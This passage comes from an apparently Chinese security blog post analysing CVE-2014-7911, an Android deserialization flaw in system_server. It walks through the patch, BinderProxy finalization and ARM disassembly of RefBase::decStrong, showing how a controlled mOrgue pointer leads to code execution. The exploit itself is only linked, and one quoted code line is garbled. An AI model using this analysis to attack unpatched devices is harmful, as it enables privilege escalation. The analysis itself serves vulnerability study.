<p>对比之前版本知道，最后classDesc.checkAndGetTcObjectClass()这里就是补丁代码了，进去checkAndGetTcObjectClass()看到上边几行注释</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * Checks the local class to make sure it is valid for &#123;<span class="doctag">@link</span> ObjectStreamConstants#TC_OBJECT&#125;</span><br><span class="line"> * deserialization. Also performs some sanity checks of the stream data. This method is used</span><br><span class="line"> * during deserialization to confirm the local class is likely to be compatible with the coming</span><br><span class="line"> * stream data, but before an instance is instantiated.</span><br><span class="line"> *</span><br><span class="line"> * <span class="doctag">@hide</span> used internally during deserialization</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。<br>更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9" target="_blank" rel="external">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p>
<h2 id="漏洞分析">漏洞分析</h2><p>回过头来看crash dump信息，根据backtrace显示的堆栈调用最后调用了<code>/system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</code>。</p>
<h3 id="Android指针管理">Android指针管理</h3><p>Android中通过引用计数来实现智能指针，并且实现有强指针与弱指针。由对象本身来提供引用计数器，但是对象不会去维护引用计数器的值，而是由智能指针来管理。要达到所有对象都可用引用计数器实现智能指针管理的目标，可以定义一个公共类，提供引用计数的方法，所有对象都去继承这个公共类，这样就可以实现所有对象都可以用引用计数来管理的目标，在Android中，这个公共类就是RefBase。</p>
<p>RefBase作为公共基类提供了引用计数的方法，但是并不去维护引用计数的值，而是由两个智能指针来进行管理：sp(Strong Pointer)和wp(Weak Pointer)，代表强引用计数和弱引用计数。RefBase提供了incStrong与decStrong函数用于控制强引用计数值，其弱引用计数值是由weakref_impl控制，强引用计数与弱引用数都保存在weakref_impl *类型的成员变量mRefs中。</p>
<p>当sp销毁时其析构函数调用对象即RefBase的decStrong函数，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<h3 id="GC机制">GC机制</h3><p>简单介绍一下Java对象的生命周期与垃圾回收(摘自网络)：</p>
<p>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收和对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<h3 id="漏洞成因">漏洞成因</h3><p>通过RefBase和GC机制的简单了解得知该处崩溃是由于对象销毁触发GC处理过程，当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，由于该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法，然后会调用destroy()，destroy()为native方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        destroy();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>定位到<a href="https://android.googlesource.com/platform/frameworks/base/+/f76a50c/core/jni/android_util_Binder.cpp" target="_blank" rel="external">android_os_BinderProxy_destroy</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    IBinder* b = (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">    LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong(obj);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码一开始就将gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue强制转换成函数指针，那么gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue是什么鬼？找到BinderProxy服务注册函数int_register_android_os_BinderProxy</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kBinderProxyPathName = <span class="string">"android/os/BinderProxy"</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">int_register_android_os_BinderProxy</span><span class="params">(JNIEnv* env)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/ref/WeakReference"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.ref.WeakReference"</span>);</span><br><span class="line">    gWeakReferenceOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gWeakReferenceOffsets.mGet = env-&gt;GetMethodID(clazz, <span class="string">"get"</span>, <span class="string">"()Ljava/lang/Object;"</span>);</span><br><span class="line">    assert(gWeakReferenceOffsets.mGet);</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/Error"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.Error"</span>);</span><br><span class="line">    gErrorOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    clazz = env-&gt;FindClass(kBinderProxyPathName);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class android.os.BinderProxy"</span>);</span><br><span class="line">    gBinderProxyOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gBinderProxyOffsets.mConstructor = env-&gt;GetMethodID(clazz, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mConstructor);</span><br><span class="line">    gBinderProxyOffsets.mSendDeathNotice = env-&gt;GetStaticMethodID(clazz, <span class="string">"sendDeathNotice"</span>, <span class="string">"(Landroid/os/IBinder$DeathRecipient;)V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSendDeathNotice);</span><br><span class="line">    gBinderProxyOffsets.mObject = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mObject);</span><br><span class="line">    gBinderProxyOffsets.mSelfvoid RefBase::decStrong = env-&gt;GetFieldID(clazz, <span class="string">"mSelf"</span>, <span class="string">"Ljava/lang/ref/WeakReference;"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSelf);</span><br><span class="line">    gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mOrgue);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中可以看到，通过一些列反射通过对象引用计数器获取android.os.BinderProxy对象实例，然后通过</p>
<pre><code>gBinderProxyOffsets.mObject = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);
gBinderProxyOffsets.mOrgue = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);
</code></pre><p>获取其成员变量mObject和mOrgue的值，即获取了AAdroid.os.BinderProxy中的变量mObject和mOrgue的值。而我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<p>继续看android_os_BinderProxy_destroy代码，将mOrgue强制转成DeathRecipientList函数指针后会调用函数drl-&gt;decStrong((void*)javaObjectForIBinder)，DeathRecipientList继承RefBase，找到RefBase类中的decStrong方法，位于<a href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp" target="_blank" rel="external">RefBase.cpp</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 成员变量mRefs是在对象的构造函数中初始化</span></span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    <span class="comment">// 强引用数与弱引用数同时减1</span></span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="comment">// 获取强引用数，返回&amp;refs-&gt;mStrong</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="comment">// 如果这是最后一个强引用的话</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个对象销毁过程参考前边介绍的Android指针管理，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<p>我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针，所以执行到refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致我们的代码执行。mBase类型为RefBase* const，相当于直接跳到mOrgue地址执行了，即程序崩在了0x1337bef3，r0为函数第一个参数即this指针，所以其值也是0x1337bef3。</p>
<h3 id="反汇编定位崩溃点">反汇编定位崩溃点</h3><p>经过前边的分析已经知道了漏洞成因以及最终漏洞触发函数，但是想要利用漏洞就必须定位到具体的触发崩溃的点，需要知道最后是哪个操作造成的，以及相关寄存器哪些是可控的。</p>
<p>从android4.4.4原生系统中扣出libutil.so文件，然后反汇编android::RefBase::decStrong(void const*) const函数，汇编代码以及说明如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             _ZNK7android7RefBase9decStrongEPKv:        <span class="comment">// android::RefBase::decStrong(void const*) const</span></span><br><span class="line"><span class="number">0000</span>d172         push       &#123;r4, r5, r6, lr&#125;                                    ; XREF=_ZN7android2spINS_9BlobCache4BlobEED1Ev+<span class="number">10</span>, _ZN7android2spINS_9BlobCache4BlobEEaSERKS3_+<span class="number">22</span>, _ZN7android2spINS_14LooperCallbackEED1Ev+<span class="number">18</span>, _ZN7android2spINS_6ThreadEE5clearEv+<span class="number">18</span>, _ZN7android6Thread3runEPKcij+<span class="number">70</span>, _ZN7android6Thread11_threadLoopEPv+<span class="number">178</span>, _ZN7android6Looper16threadDestructorEPv+<span class="number">6</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">42</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">52</span>, _ZN7android2spINS_14LooperCallbackEEaSERKS2_+<span class="number">36</span>, _ZN7android6Looper9pollInnerEi+<span class="number">506</span>, …</span><br><span class="line"><span class="number">0000</span>d174         mov        r5, r0	<span class="comment">// r0为drl的this指针</span></span><br><span class="line"><span class="number">0000</span>d176         ldr        r4, [r0, <span class="preprocessor">#<span class="number">0x4</span>]	<span class="comment">// mRefs是drl父类RefBase虚函数下边第一个私有变量，即为drl虚表下边第一个私有变量，所以地址为this+4</span></span></span><br><span class="line"><span class="number">0000</span>d178         mov        r6, r1</span><br><span class="line"><span class="number">0000</span>d17a         mov        r0, r4	<span class="comment">// &amp;refs-&gt;mStrong为weakref_impl类的第一成员变量，并且其父类weakref_type没有虚函数，所以不存在虚表，所以其地址为r4</span></span><br><span class="line"><span class="number">0000</span>d17c         blx        android_atomic_dec@PLT <span class="comment">// 获取强引用数</span></span><br><span class="line"><span class="number">0000</span>d180         cmp        r0, <span class="preprocessor">#<span class="number">0x1</span>	<span class="comment">// 返回值与1比较</span></span></span><br><span class="line"><span class="number">0000</span>d182         bne        <span class="number">0xd19c</span>	<span class="comment">// 不等跳到0xd19c 该处为漏洞利用的约束条件</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d184         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0x8</span>]	<span class="comment">// weakref_impl类中mBase位于第三个成员变量，所以其地址为r4+8</span></span></span><br><span class="line"><span class="number">0000</span>d186         mov        r1, r6	<span class="comment">// refs-&gt;mBase-&gt;onLastStrongRef参数id</span></span><br><span class="line"><span class="number">0000</span>d188         ldr        r3, [r0]	<span class="comment">// 将mBase地址传给r3，即r3为RefBase类this指针</span></span><br><span class="line"><span class="number">0000</span>d18a         ldr        r2, [r3, <span class="preprocessor">#<span class="number">0xc</span>]	<span class="comment">// 父类weakref_type虚表指针vfptr+私有变量mRefs + 4(onLastStrongRef为第二个虚函数) = 0xC</span></span></span><br><span class="line"><span class="number">0000</span>d18c         blx        r2	<span class="comment">// 调用refs-&gt;mBase-&gt;onLastStrongRef</span></span><br><span class="line"><span class="number">0000</span>d18e         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0xc</span>]</span></span><br><span class="line"><span class="number">0000</span>d190         lsls       r0, r0, <span class="preprocessor">#<span class="number">0x1f</span></span></span><br><span class="line"><span class="number">0000</span>d192         bmi        <span class="number">0xd19c</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d194         ldr        r1, [r5]</span><br><span class="line"><span class="number">0000</span>d196         mov        r0, r5</span><br><span class="line"><span class="number">0000</span>d198         ldr        r3, [r1, <span class="preprocessor">#<span class="number">0x4</span>]</span></span><br><span class="line"><span class="number">0000</span>d19a         blx        r3</span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d19c         mov        r0, r4                                              ; argument <span class="preprocessor">#<span class="number">1</span> for method _ZN7android7RefBase12weakref_type7decWeakEPKv, XREF=_ZNK7android7RefBase9decStrongEPKv+<span class="number">16</span>, _ZNK7android7RefBase9decStrongEPKv+<span class="number">32</span></span></span><br><span class="line"><span class="number">0000</span>d19e         mov        r1, r6</span><br><span class="line"><span class="number">0000</span>d1a0         pop.w      &#123;r4, r5, r6, lr&#125;</span><br><span class="line"><span class="number">0000</span>d1a4         b.w        _ZN7android7RefBase12weakref_type7decWeakEPKv       ; android::RefBase::weakref_type::decWeak(<span class="keyword">void</span> <span class="keyword">const</span>*)</span><br><span class="line">                        ; endp</span><br></pre></td></tr></table></figure>
<p>根据汇编代码可以看出，为实现任意代码执行得满足条件：<br>&amp;refs-&gt;mStrong == 1，即<code>*(*(mOrgue+4)) == 1</code><br>所以总结下来应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">0xC</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对照反汇编代码更容易看出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> android::RefBase::decStrong(<span class="keyword">void</span> <span class="keyword">const</span>*) <span class="keyword">const</span>(<span class="keyword">void</span> * arg0) &#123;</span><br><span class="line">    r5 = arg0;</span><br><span class="line">    r4 = *(arg0 + <span class="number">0x4</span>);</span><br><span class="line">    r6 = r1;</span><br><span class="line">    <span class="keyword">if</span> (android_atomic_dec() == <span class="number">0x1</span>) &#123;</span><br><span class="line">            r0 = *(r4 + <span class="number">0x8</span>);</span><br><span class="line">            r3 = *r0;</span><br><span class="line">            r2 = *(r3 + <span class="number">0xc</span>);</span><br><span class="line">            (r2)(r0, r6, r2, r3);</span><br><span class="line">            <span class="keyword">if</span> (PARITY(*(r4 + <span class="number">0xc</span>) &lt;&lt; <span class="number">0x1f</span>)) &#123;</span><br><span class="line">                    r1 = *r5;</span><br><span class="line">                    (*(r1 + <span class="number">0x4</span>))(r5, r1);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    r0 = android::RefBase::weakref_type::decWeak(r4);</span><br><span class="line">    <span class="keyword">return</span> r0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后执行的汇编代码地址为<br><code>r2 = *(*(*(refs+8))+0xC) = *(*(*(*(mOrgue+4)+8))+0xC)</code></p>
<h2 id="思考">思考</h2><p>通过分析，其实这个漏洞触发需要的条件就两个：</p>
<ol>
<li>向system_server传递对象，并且system_server会将该对象反序列化。</li>
<li>传递数据前将可序列化的对象修改为不可序列化。</li>
</ol>
<p>第一个问题，是否必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象？<br>并不是，其实我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。这样的系统服务还是很多的，例如frameworks\base\services\java\com\android\server目录下的系统服务，找到相对应的应用层通信调用的地方就可以了。</p>
<p>第二个问题，为什么要将AAdroid.os.BinderProxy修改为Android.os.BinderProxy？<br>漏洞的整个触发过程仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。由于finalize方法是不可控的，可控仅仅是该恶意对象，所以漏洞仍然无法利用。回头再看Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针并调用。但是其中mObject和mOrgue的值是可控的，这样就相当于可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<h2 id="漏洞利用">漏洞利用</h2><p><a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">CVE-2014-7911安卓本地提权漏洞利用</a></p>
<h2 id="参考">参考</h2><p><a href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="external">CVE-2014-7911安卓本地提权漏洞详细分析</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/" data-id="civbwoo9w003z5p6iqzdhrqwf" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/">cve</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2015/08/01/exploit-cve-2014-7911-exp/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          CVE-2014-7911安卓本地提权漏洞利用
        
      </div>
    </a>
  
  
    <a href="/2015/05/11/android-reverse-clickbutton/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">安卓逆向学习笔记-ClickButton</div>
    </a>
  
</nav>

  
</article>


<section id="comments">
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分類</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/technic/">technic</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/virus/">virus</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adb/">adb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug/">debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/english/">english</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iovyroot/">iovyroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libstagefright/">libstagefright</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lol/">lol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nvidia/">nvidia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pingpongroot/">pingpongroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pxn/">pxn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smali/">smali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symbol/">symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task/">task</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uac/">uac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webview/">webview</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xposed/">xposed</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/下载/">下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/感染/">感染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/推广/">推广</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无法描述/">无法描述</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流氓/">流氓</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/淘宝客/">淘宝客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/盗号/">盗号</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤/">过滤</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/驱动/">驱动</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤雲</h3>
    <div class="widget tagcloud">
